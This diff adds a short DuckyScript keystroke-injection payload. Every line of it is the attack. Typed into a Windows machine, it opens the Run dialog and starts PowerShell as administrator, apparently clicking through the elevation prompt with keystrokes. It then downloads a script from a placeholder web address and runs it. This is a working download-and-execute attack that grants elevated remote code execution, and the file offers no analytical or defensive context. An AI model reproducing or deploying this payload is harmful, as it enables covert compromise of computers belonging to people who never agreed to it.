@@ -1,0 +1,13 @@
+REM pulls a script from a webpage
+DELAY 10
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+CTRL SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 1000
+ENTER
+DELAY 1000
+STRINGLN Invoke-WebRequest -Uri "url" -OutFile "$home\Script.ps1"; set-location $HOME;./Script.ps1;exit
